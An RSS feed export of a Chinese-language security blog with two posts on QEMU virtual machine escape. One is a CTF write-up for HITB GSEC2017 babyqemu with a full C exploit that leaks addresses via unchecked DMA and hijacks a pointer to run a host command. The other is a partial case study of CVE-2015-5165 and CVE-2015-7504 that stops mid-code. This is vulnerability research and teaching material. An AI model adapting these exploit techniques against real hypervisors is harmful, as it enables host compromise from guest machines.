<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
<channel>
  <title>Mark's Blog</title>
  <atom:link href="https://blog.mark0519.com/#//feed.xml" rel="self" type="application/rss+xml" />
  <link>https://blog.mark0519.com/#/</link>
  <description>Live long and Pwn</description>
   
  <item>
    <title><![CDATA[QEMU逃逸  --  dma]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/221113-qemu-dma</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/221113-qemu-dma</guid>
    <description><![CDATA[<h1 id="qemu逃逸-dma">QEMU逃逸 – dma</h1>
<blockquote>
<p><code>DMA(Direct Memory Access)</code>：直接内存访问</p>
</blockquote>
<h2 id="x00-dma">0x00 DMA</h2>
<p><code>DMA(Direct Memory Access)</code>：直接内存访问</p>
<p>有两种方式引发数据传输：</p>
<p>第一种情况：软件对数据的请求</p>
<ul>
<li><p>当进程调用<code>read</code>，驱动程序函数分配一个<code>DMA</code>缓冲区，并让硬件将数据传输到这个缓冲区中，进程处于睡眠状态；</p></li>
<li><p>硬件将数据写入到<code>DMA</code>缓冲区中，当写入完毕，产生一个中断</p></li>
<li><p>中断处理程序获取输入的数据，应答中断，并唤起进程，该进程现在即可读取数据</p>
<p>第二种情况：在异步使用<code>DMA</code>时</p></li>
<li><p>硬件产生中断，宣告新数据的到来</p></li>
<li><p>中断处理程序分配一个缓冲区，并且告诉硬件向哪里传输数据</p></li>
<li><p>外围设备将数据写入数据区，完成后，产生另外一个中断</p></li>
<li><p>处理程序分发数据，唤醒任何相关进程，然后执行清理工作</p></li>
</ul>
<p>DMA控制器必须有以下功能：</p>
<p>1、 能向CPU发出系统保持(HOLD)信号，提出总线接管请求；</p>
<p>2、 当CPU发出允许接管信号后，负责对总线的控制，进入DMA方式；</p>
<p>3、 能对存储器寻址及能修改地址指针，实现对内存的读写操作；</p>
<p>4、 能决定本次DMA传送的字节数，判断DMA传送是否结束；</p>
<p>5、 发出DMA结束信号，使CPU恢复正常工作状态。</p>
<p><strong>注意：</strong>当虚拟机通过<code>DMA（Direct Memory Access）</code>访问大块<code>I/O</code>时，<code>QEMU</code>模拟程序将不会把结果放进共享页中，而是通过内存映射的方式将结果直接写到虚拟机的内存中，然后通知<code>KVM</code>模块告诉客户机<code>DMA</code>操作已经完成。</p>
<h2 id="x01-hitb-gsec2017-babyqemu">0x01 HITB GSEC2017 babyqemu</h2>
<p>DMA存在越界读和越界写</p>
<blockquote>
<p>本质上是完全没有检查dma.cnt的数字</p>
</blockquote>
<p>泄露qemu_elf_base，寻找system的plt表地址，填入“cat flag”字符串</p>
<h2 id="x02-exploit">0x02 exploit</h2>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" title="1"><span class="pp">#include</span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb1-2" title="2"><span class="pp">#include</span><span class="im">&lt;fcntl.h&gt;</span></a>
<a class="sourceLine" id="cb1-3" title="3"><span class="pp">#include</span><span class="im">&lt;sys/mman.h&gt;</span></a>
<a class="sourceLine" id="cb1-4" title="4"><span class="pp">#include</span><span class="im">&lt;sys/io.h&gt;</span></a>
<a class="sourceLine" id="cb1-5" title="5"><span class="pp">#include</span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb1-6" title="6"><span class="pp">#include</span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb1-7" title="7"></a>
<a class="sourceLine" id="cb1-8" title="8"><span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</a>
<a class="sourceLine" id="cb1-9" title="9"><span class="dt">uint64_t</span> phy_userbuf;</a>
<a class="sourceLine" id="cb1-10" title="10"><span class="dt">char</span> *userbuf;</a>
<a class="sourceLine" id="cb1-11" title="11"></a>
<a class="sourceLine" id="cb1-12" title="12"><span class="dt">void</span> Err(<span class="dt">char</span> * err){</a>
<a class="sourceLine" id="cb1-13" title="13">    printf(<span class="st">&quot;[*] Error: %s</span><span class="sc">\n</span><span class="st">&quot;</span>,err);</a>
<a class="sourceLine" id="cb1-14" title="14">    exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb1-15" title="15">}</a>
<a class="sourceLine" id="cb1-16" title="16"></a>
<a class="sourceLine" id="cb1-17" title="17"><span class="dt">void</span> init_mmio(){</a>
<a class="sourceLine" id="cb1-18" title="18">    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,O_RDWR|O_SYNC);</a>
<a class="sourceLine" id="cb1-19" title="19">    mmio_mem = mmap(<span class="dv">0</span>,<span class="bn">0x1000</span>,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,<span class="dv">0</span>);</a>
<a class="sourceLine" id="cb1-20" title="20">}</a>
<a class="sourceLine" id="cb1-21" title="21"></a>
<a class="sourceLine" id="cb1-22" title="22"><span class="dt">void</span> mmio_write(<span class="dt">uint32_t</span> addr,<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb1-23" title="23">    *(<span class="dt">uint32_t</span>*)(mmio_mem+addr) = value;</a>
<a class="sourceLine" id="cb1-24" title="24">}</a>
<a class="sourceLine" id="cb1-25" title="25"></a>
<a class="sourceLine" id="cb1-26" title="26"><span class="dt">uint64_t</span> mmio_read(<span class="dt">uint64_t</span> addr){</a>
<a class="sourceLine" id="cb1-27" title="27">    <span class="cf">return</span> *(<span class="dt">uint64_t</span>*)(mmio_mem+addr); </a>
<a class="sourceLine" id="cb1-28" title="28">}</a>
<a class="sourceLine" id="cb1-29" title="29"></a>
<a class="sourceLine" id="cb1-30" title="30"><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</a>
<a class="sourceLine" id="cb1-31" title="31">    <span class="dt">uint64_t</span> data;</a>
<a class="sourceLine" id="cb1-32" title="32"></a>
<a class="sourceLine" id="cb1-33" title="33">    <span class="dt">int</span> fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</a>
<a class="sourceLine" id="cb1-34" title="34">    <span class="cf">if</span>(!fd){</a>
<a class="sourceLine" id="cb1-35" title="35">        perror(<span class="st">&quot;open pagemap&quot;</span>);</a>
<a class="sourceLine" id="cb1-36" title="36">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-37" title="37">    }</a>
<a class="sourceLine" id="cb1-38" title="38"></a>
<a class="sourceLine" id="cb1-39" title="39">    <span class="dt">size_t</span> pagesize = getpagesize();</a>
<a class="sourceLine" id="cb1-40" title="40">    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</a>
<a class="sourceLine" id="cb1-41" title="41"></a>
<a class="sourceLine" id="cb1-42" title="42">    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb1-43" title="43">        puts(<span class="st">&quot;lseek&quot;</span>);</a>
<a class="sourceLine" id="cb1-44" title="44">        close(fd);</a>
<a class="sourceLine" id="cb1-45" title="45">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-46" title="46">    }</a>
<a class="sourceLine" id="cb1-47" title="47"></a>
<a class="sourceLine" id="cb1-48" title="48">    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</a>
<a class="sourceLine" id="cb1-49" title="49">        puts(<span class="st">&quot;read&quot;</span>);</a>
<a class="sourceLine" id="cb1-50" title="50">        close(fd);</a>
<a class="sourceLine" id="cb1-51" title="51">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-52" title="52">    }</a>
<a class="sourceLine" id="cb1-53" title="53"></a>
<a class="sourceLine" id="cb1-54" title="54">    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</a>
<a class="sourceLine" id="cb1-55" title="55">        puts(<span class="st">&quot;page&quot;</span>);</a>
<a class="sourceLine" id="cb1-56" title="56">        close(fd);</a>
<a class="sourceLine" id="cb1-57" title="57">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-58" title="58">    }</a>
<a class="sourceLine" id="cb1-59" title="59"></a>
<a class="sourceLine" id="cb1-60" title="60">    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb1-61" title="61">    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</a>
<a class="sourceLine" id="cb1-62" title="62"></a>
<a class="sourceLine" id="cb1-63" title="63">    close(fd);</a>
<a class="sourceLine" id="cb1-64" title="64"></a>
<a class="sourceLine" id="cb1-65" title="65">    <span class="cf">return</span> phyaddr;</a>
<a class="sourceLine" id="cb1-66" title="66">}</a>
<a class="sourceLine" id="cb1-67" title="67"></a>
<a class="sourceLine" id="cb1-68" title="68"><span class="dt">uint64_t</span> dma_get_src(){</a>
<a class="sourceLine" id="cb1-69" title="69">    <span class="cf">return</span> mmio_read(<span class="bn">0x80</span>);</a>
<a class="sourceLine" id="cb1-70" title="70">}</a>
<a class="sourceLine" id="cb1-71" title="71"></a>
<a class="sourceLine" id="cb1-72" title="72"><span class="dt">uint64_t</span> dma_get_dst(){</a>
<a class="sourceLine" id="cb1-73" title="73">    <span class="cf">return</span> mmio_read(<span class="bn">0x88</span>);</a>
<a class="sourceLine" id="cb1-74" title="74">}</a>
<a class="sourceLine" id="cb1-75" title="75"></a>
<a class="sourceLine" id="cb1-76" title="76"><span class="dt">uint64_t</span> dma_get_cnt(){</a>
<a class="sourceLine" id="cb1-77" title="77">    <span class="cf">return</span> mmio_read(<span class="bn">0x90</span>);</a>
<a class="sourceLine" id="cb1-78" title="78">}</a>
<a class="sourceLine" id="cb1-79" title="79"></a>
<a class="sourceLine" id="cb1-80" title="80"><span class="dt">uint64_t</span> dma_get_cmd(){</a>
<a class="sourceLine" id="cb1-81" title="81">    <span class="cf">return</span> mmio_read(<span class="bn">0x98</span>);</a>
<a class="sourceLine" id="cb1-82" title="82">}</a>
<a class="sourceLine" id="cb1-83" title="83"></a>
<a class="sourceLine" id="cb1-84" title="84"><span class="dt">void</span> dma_set_src(<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb1-85" title="85">    mmio_write(<span class="bn">0x80</span>,value);</a>
<a class="sourceLine" id="cb1-86" title="86">}</a>
<a class="sourceLine" id="cb1-87" title="87"></a>
<a class="sourceLine" id="cb1-88" title="88"><span class="dt">void</span> dma_set_dst(<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb1-89" title="89">    mmio_write(<span class="bn">0x88</span>,value);</a>
<a class="sourceLine" id="cb1-90" title="90">}</a>
<a class="sourceLine" id="cb1-91" title="91"></a>
<a class="sourceLine" id="cb1-92" title="92"><span class="dt">void</span> dma_set_cnt(<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb1-93" title="93">    mmio_write(<span class="bn">0x90</span>,value);</a>
<a class="sourceLine" id="cb1-94" title="94">}</a>
<a class="sourceLine" id="cb1-95" title="95"></a>
<a class="sourceLine" id="cb1-96" title="96"><span class="dt">void</span> dma_set_cmd(<span class="dt">uint32_t</span> value){ <span class="co">// timer</span></a>
<a class="sourceLine" id="cb1-97" title="97">    mmio_write(<span class="bn">0x98</span>,value);</a>
<a class="sourceLine" id="cb1-98" title="98">}</a>
<a class="sourceLine" id="cb1-99" title="99"></a>
<a class="sourceLine" id="cb1-100" title="100"><span class="dt">void</span> dma_do_write(<span class="dt">uint32_t</span> addr, <span class="dt">void</span>* buf, <span class="dt">size_t</span> len){</a>
<a class="sourceLine" id="cb1-101" title="101">    memcpy(userbuf, buf, len);</a>
<a class="sourceLine" id="cb1-102" title="102"></a>
<a class="sourceLine" id="cb1-103" title="103">    dma_set_src(phy_userbuf);</a>
<a class="sourceLine" id="cb1-104" title="104">    dma_set_dst(addr);</a>
<a class="sourceLine" id="cb1-105" title="105">    dma_set_cnt(len);</a>
<a class="sourceLine" id="cb1-106" title="106"></a>
<a class="sourceLine" id="cb1-107" title="107">    dma_set_cmd(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb1-108" title="108">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb1-109" title="109">}</a>
<a class="sourceLine" id="cb1-110" title="110"></a>
<a class="sourceLine" id="cb1-111" title="111"><span class="dt">void</span> dma_do_enc(<span class="dt">uint32_t</span> addr, <span class="dt">size_t</span> len){</a>
<a class="sourceLine" id="cb1-112" title="112">    dma_set_src(addr);</a>
<a class="sourceLine" id="cb1-113" title="113">    dma_set_cnt(len);</a>
<a class="sourceLine" id="cb1-114" title="114"></a>
<a class="sourceLine" id="cb1-115" title="115">    dma_set_cmd(<span class="dv">7</span>);</a>
<a class="sourceLine" id="cb1-116" title="116">}</a>
<a class="sourceLine" id="cb1-117" title="117"></a>
<a class="sourceLine" id="cb1-118" title="118"></a>
<a class="sourceLine" id="cb1-119" title="119"><span class="dt">int</span> main(){</a>
<a class="sourceLine" id="cb1-120" title="120">    init_mmio();</a>
<a class="sourceLine" id="cb1-121" title="121">    puts(<span class="st">&quot;[*] init mmio&quot;</span>);</a>
<a class="sourceLine" id="cb1-122" title="122">    printf(<span class="st">&quot;[*] mmio_mem ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,mmio_mem);</a>
<a class="sourceLine" id="cb1-123" title="123"></a>
<a class="sourceLine" id="cb1-124" title="124">    userbuf = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -<span class="dv">1</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb1-125" title="125">    memset(userbuf,<span class="dv">0</span>,<span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb1-126" title="126">    phy_userbuf = va2pa(userbuf);</a>
<a class="sourceLine" id="cb1-127" title="127">    printf(<span class="st">&quot;[*] userbuf ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,userbuf);</a>
<a class="sourceLine" id="cb1-128" title="128">    printf(<span class="st">&quot;[*] phy_userbuf ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,phy_userbuf);</a>
<a class="sourceLine" id="cb1-129" title="129"></a>
<a class="sourceLine" id="cb1-130" title="130">    puts(<span class="st">&quot;[*] leak addr&quot;</span>);</a>
<a class="sourceLine" id="cb1-131" title="131">    dma_set_src(<span class="bn">0x40000</span>+<span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb1-132" title="132">    dma_set_dst(phy_userbuf);</a>
<a class="sourceLine" id="cb1-133" title="133">    dma_set_cnt(<span class="bn">0x8</span>);</a>
<a class="sourceLine" id="cb1-134" title="134">    dma_set_cmd(<span class="bn">0x3</span>);</a>
<a class="sourceLine" id="cb1-135" title="135">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb1-136" title="136"></a>
<a class="sourceLine" id="cb1-137" title="137">    <span class="dt">size_t</span> enc_addr = *(<span class="dt">size_t</span>*)userbuf;</a>
<a class="sourceLine" id="cb1-138" title="138">    printf(<span class="st">&quot;[*] enc_addr ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,enc_addr);</a>
<a class="sourceLine" id="cb1-139" title="139">    <span class="dt">size_t</span> qemu_base = enc_addr-<span class="bn">0x283dd0</span>;</a>
<a class="sourceLine" id="cb1-140" title="140">    printf(<span class="st">&quot;[*] qemu_base ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,qemu_base);</a>
<a class="sourceLine" id="cb1-141" title="141">    <span class="dt">size_t</span> system_plt = qemu_base+<span class="bn">0x1FDB18</span>;</a>
<a class="sourceLine" id="cb1-142" title="142">    printf(<span class="st">&quot;[*] system_plt ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,system_plt);</a>
<a class="sourceLine" id="cb1-143" title="143"></a>
<a class="sourceLine" id="cb1-144" title="144">    puts(<span class="st">&quot;[*] edit enc ==&gt; system@plt&quot;</span>);</a>
<a class="sourceLine" id="cb1-145" title="145">    dma_do_write(<span class="bn">0x40000</span>+<span class="bn">0x1000</span>, &amp;system_plt, <span class="bn">0x8</span>);</a>
<a class="sourceLine" id="cb1-146" title="146"></a>
<a class="sourceLine" id="cb1-147" title="147">    puts(<span class="st">&quot;[*] set &#39;cat flag&#39; &quot;</span>);</a>
<a class="sourceLine" id="cb1-148" title="148">    <span class="dt">char</span>* catflag = <span class="st">&quot;cat ./flag</span><span class="sc">\x00\x00</span><span class="st">&quot;</span>;</a>
<a class="sourceLine" id="cb1-149" title="149">    dma_do_write(<span class="bn">0x200</span>+<span class="bn">0x40000</span>, catflag, <span class="dv">12</span>);</a>
<a class="sourceLine" id="cb1-150" title="150">    <span class="co">// pause();</span></a>
<a class="sourceLine" id="cb1-151" title="151">    puts(<span class="st">&quot;[*] enc &#39;cat flag&#39; &quot;</span>);</a>
<a class="sourceLine" id="cb1-152" title="152">    dma_do_enc(<span class="bn">0x200</span>+<span class="bn">0x40000</span>, <span class="dv">8</span>);</a>
<a class="sourceLine" id="cb1-153" title="153"></a>
<a class="sourceLine" id="cb1-154" title="154">    <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-155" title="155">}</a></code></pre></div>]]></description>
    <pubDate>Sun, 13 Nov 2022 21:52:48 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[VM escape-QEMU Case Study]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/221110-qemu-case</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/221110-qemu-case</guid>
    <description><![CDATA[<h1 id="vm-escape-qemu-case-study">VM escape-QEMU Case Study</h1>
<h2 id="x00-intro">0x00 Intro</h2>
<p>一句话说明虚拟机逃逸漏洞利用其实就是：</p>
<blockquote>
<p>利用qemu代码实现上的漏洞去起一个<code>/bin/sh</code>什么的（当然执行计算器也是可以的）</p>
</blockquote>
<p>问题是我们在guest虚拟机里面，我们怎么控制那个<code>/bin/sh</code>呢，那就是通过共享内存交换数据（传递我们的命令到共享内存，最终传递给shell，之后将shell命令的执行结果放入共享内存传递回来guest虚拟机），从而实现在guest虚拟机控制qemu启动的<code>/bin/sh</code>。</p>
<p>这个案例讲的是CVE-2015-5165 (信息泄露漏洞) and CVE-2015-7504 (堆溢出漏洞)</p>
<h2 id="x01-kvmqemu-overview">0x01 KVM/QEMU Overview</h2>
<p>KVM（Kernel Virtual Machine）是Linux的一个内核驱动模块，它能够让Linux主机成为一个Hypervisor（虚拟机监控器）。</p>
<p>QEMU（quick emulator)本身并不包含或依赖KVM模块，而是一套由Fabrice Bellard编写的模拟计算机的free软件。QEMU虚拟机是一个纯软件的实现，可以在没有KVM模块的情况下独立运行，但是性能比较低。QEMU使用了KVM模块的虚拟化功能，为自己的虚拟机提供硬件虚拟化加速以提高虚拟机的性能。</p>
<h3 id="environment">1.1 Environment</h3>
<p>git clone下来后需要回退到漏洞版本</p>
<p>下面编译成x86_64，并且启用调试</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb1-1" title="1"><span class="fu">git</span> clone git://git.qemu-project.org/qemu.git</a>
<a class="sourceLine" id="cb1-2" title="2"><span class="fu">git</span> checkout bd80b59</a>
<a class="sourceLine" id="cb1-3" title="3"><span class="fu">mkdir</span> -p bin/debug/native</a>
<a class="sourceLine" id="cb1-4" title="4"><span class="bu">cd</span> bin/debug/native</a>
<a class="sourceLine" id="cb1-5" title="5"><span class="ex">../../../configure</span> --target-list=x86_64-softmmu --enable-debug --disable-werror</a>
<a class="sourceLine" id="cb1-6" title="6"><span class="fu">make</span></a></code></pre></div>
<p>之后使用qemu-img来生成一个qcow2系统文件</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb2-1" title="1"><span class="ex">./qemu-img</span> create -f qcow2 ubuntu.qcow2 20G</a>
<a class="sourceLine" id="cb2-2" title="2"><span class="fu">sudo</span> chmod 777 /dev/kvm</a></code></pre></div>
<p>之后对qcow2系统文件中的系统进行安装</p>
<blockquote>
<p>其中ubuntu16.iso是自己下载的</p>
</blockquote>
<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb3-1" title="1"><span class="ex">./x86_64-softmmu/qemu-system-x86_64</span> -enable-kvm -m 2048 -hda ./ubuntu.qcow2 -cdrom <span class="st">&#39;/home/mark/vm/ubuntu16.iso&#39;</span></a></code></pre></div>
<p>安装完成后就获得了一个有系统的qcow2文件，我们分配2GB的内存并创建两个网络接口卡：RTL8139和PCNET，同时创建tap接口连接虚拟机和主机：</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb4-1" title="1"> <span class="fu">sudo</span> tunctl -t tap0 -u <span class="kw">`</span><span class="fu">whoami</span><span class="kw">`</span></a>
<a class="sourceLine" id="cb4-2" title="2"> <span class="fu">sudo</span> ifconfig tap0 192.168.2.1/24</a>
<a class="sourceLine" id="cb4-3" title="3"><span class="ex">./x86_64-softmmu/qemu-system-x86_64</span> -enable-kvm -m 2048 -display vnc=:89 \</a>
<a class="sourceLine" id="cb4-4" title="4">   -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \</a>
<a class="sourceLine" id="cb4-5" title="5">   -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1 \</a>
<a class="sourceLine" id="cb4-6" title="6">   -drive file=/home/mark/Desktop/qemu/bin/debug/native/ubuntu.qcow2,format=qcow2,if=ide,cache=writeback \</a>
<a class="sourceLine" id="cb4-7" title="7">   -redir tcp:5022::22</a></code></pre></div>
<p>添加这个参数<code>-redir tcp:5022::22</code>映射ssh端口，我们连接5022即可连接qemu里面的ssh</p>
<p>如果想使用GDB调试</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb5-1" title="1"><span class="fu">gdb</span> --args ./x86_64-softmmu/qemu-system-x86_64 -enable-kvm -m 2048   -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0    -redir tcp:5022::22    -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1    -drive file=/home/mark/Desktop/qemu/bin/debug/native/ubuntu.qcow2,format=qcow2,if=ide,cache=writeback</a></code></pre></div>
<h3 id="qemu-memory-layout">1.2 QEMU Memory Layout</h3>
<p>guest虚拟机的物理内存实际上是qemu程序mmap出来的一块private属性的虚拟内存。而且PROT_EXEC这个标志在这个虚拟内存中是不启用的</p>
<p>下面作者的图比较直观</p>
<figure>
<img src="http://pic.giantbranch.cn/pic/1561273670649.jpg" alt="QEMU Memory Layout" /><figcaption>QEMU Memory Layout</figcaption>
</figure>
<p>此外，QEMU为BIOS和ROM保留了一个内存区域。 这些映射在QEMU映射文件中可用：</p>
<pre><code>root@ubuntu:/home/mark# cat /proc/3481/maps
55bb934ac000-55bb93a4c000 r-xp 00000000 08:01 2127821                    /home/mark/Desktop/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64
55bb93c4b000-55bb93d15000 r--p 0059f000 08:01 2127821                    /home/mark/Desktop/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64
55bb93d15000-55bb93d93000 rw-p 00669000 08:01 2127821                    /home/mark/Desktop/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64
55bb93d93000-55bb94202000 rw-p 00000000 00:00 0 
55bb95758000-55bb97186000 rw-p 00000000 00:00 0                          [heap]
7f22937ff000-7f2293800000 ---p 00000000 00:00 0 
7f2293800000-7f2294000000 rw-p 00000000 00:00 0 
7f2294000000-7f2314000000 rw-p 00000000 00:00 0 

                    ......                                              [other shared libs]

7f23266a6000-7f23266a9000 rw-s 00000000 00:0e 11411                      anon_inode:kvm-vcpu:0
7f23266a9000-7f23266b0000 r--s 00000000 08:01 1977540                    /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
7f23266b0000-7f23266b1000 r--p 00029000 08:01 786525                     /lib/x86_64-linux-gnu/ld-2.27.so
7f23266b1000-7f23266b2000 rw-p 0002a000 08:01 786525                     /lib/x86_64-linux-gnu/ld-2.27.so
7f23266b2000-7f23266b3000 rw-p 00000000 00:00 0 
7ffdcf24e000-7ffdcf26f000 rw-p 00000000 00:00 0                          [stack]
7ffdcf3d0000-7ffdcf3d3000 r--p 00000000 00:00 0                          [vvar]
7ffdcf3d3000-7ffdcf3d4000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]</code></pre>
<p>由于我们给他分配了2GB内存，也就是0x80000000</p>
<p><img src="https://pic1.imgdb.cn/item/636cf35216f2c2beb1681ed9.png" /></p>
<h3 id="address-translation">1.3 Address Translation</h3>
<p>在QEMU中存在两个翻译层：Guest Virtual Address → Guest Physical Address → Host Virtual Address</p>
<ul>
<li>从Guest虚拟地址到Guest物理地址。 在我们的利用中，我们需要配置需要DMA访问的网卡设备。 例如，我们需要提供Tx / Rx缓冲区的<strong>物理地址</strong>以正确配置网卡设备。</li>
<li>从Guest物理地址到QEMU的虚拟地址空间。 在我们的攻击中，我们需要注入伪造的结构，并在<strong>QEMU的虚拟地址空间</strong>中获得其精确地址。</li>
</ul>
<p>在x64系统上，虚拟地址由页偏移量（位0-11）和页码组成。 在linux系统上，具有CAP_SYS_ADMIN特权的用户空间进程能够使用页面映射文件（pagemap ）找出虚拟地址和物理地址的映射。 页面映射文件为每个虚拟页面存储一个64位值，其中<code>physical_address = PFN * page_size + offset</code></p>
<p>相关代码：</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb7-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb7-2" title="2"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
<a class="sourceLine" id="cb7-3" title="3"><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb7-4" title="4"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
<a class="sourceLine" id="cb7-5" title="5"><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></a>
<a class="sourceLine" id="cb7-6" title="6"><span class="pp">#include </span><span class="im">&lt;assert.h&gt;</span></a>
<a class="sourceLine" id="cb7-7" title="7"><span class="pp">#include </span><span class="im">&lt;inttypes.h&gt;</span></a>
<a class="sourceLine" id="cb7-8" title="8"></a>
<a class="sourceLine" id="cb7-9" title="9"><span class="pp">#define PAGE_SHIFT  12</span></a>
<a class="sourceLine" id="cb7-10" title="10"><span class="pp">#define PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></a>
<a class="sourceLine" id="cb7-11" title="11"><span class="pp">#define PFN_PRESENT (1ull &lt;&lt; 63)</span></a>
<a class="sourceLine" id="cb7-12" title="12"><span class="pp">#define PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></a>
<a class="sourceLine" id="cb7-13" title="13"></a>
<a class="sourceLine" id="cb7-14" title="14"><span class="dt">int</span> fd;</a>
<a class="sourceLine" id="cb7-15" title="15"><span class="co">// 获取页内偏移</span></a>
<a class="sourceLine" id="cb7-16" title="16"><span class="dt">uint32_t</span> page_offset(<span class="dt">uint32_t</span> addr)</a>
<a class="sourceLine" id="cb7-17" title="17">{</a>
<a class="sourceLine" id="cb7-18" title="18">    <span class="co">// addr &amp; 0xfff</span></a>
<a class="sourceLine" id="cb7-19" title="19">    <span class="cf">return</span> addr &amp; ((<span class="dv">1</span> &lt;&lt; PAGE_SHIFT) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb7-20" title="20">}</a>
<a class="sourceLine" id="cb7-21" title="21"></a>
<a class="sourceLine" id="cb7-22" title="22"><span class="dt">uint64_t</span> gva_to_gfn(<span class="dt">void</span> *addr)</a>
<a class="sourceLine" id="cb7-23" title="23">{</a>
<a class="sourceLine" id="cb7-24" title="24">    <span class="dt">uint64_t</span> pme, gfn;</a>
<a class="sourceLine" id="cb7-25" title="25">    <span class="dt">size_t</span> offset;</a>
<a class="sourceLine" id="cb7-26" title="26"></a>
<a class="sourceLine" id="cb7-27" title="27">    printf(<span class="st">&quot;pfn_item_offset : %p</span><span class="sc">\n</span><span class="st">&quot;</span>, (<span class="dt">uintptr_t</span>)addr &gt;&gt; <span class="dv">9</span>);</a>
<a class="sourceLine" id="cb7-28" title="28">    offset = ((<span class="dt">uintptr_t</span>)addr &gt;&gt; <span class="dv">9</span>) &amp; ~<span class="dv">7</span>;</a>
<a class="sourceLine" id="cb7-29" title="29"></a>
<a class="sourceLine" id="cb7-30" title="30">    <span class="co">//一开始除以 0x1000  （getpagesize=0x1000，4k对齐，而且本来低12位就是页内索引，需要去掉），即除以2**12, 这就获取了页号了，</span></a>
<a class="sourceLine" id="cb7-31" title="31">    <span class="co">//pagemap中一个地址64位，即8字节，也即sizeof(uint64_t)，所以有了页号后，我们需要乘以8去找到对应的偏移从而获得对应的物理地址</span></a>
<a class="sourceLine" id="cb7-32" title="32">    <span class="co">//最终  vir/2^12 * 8 = (vir / 2^9) &amp; ~7 </span></a>
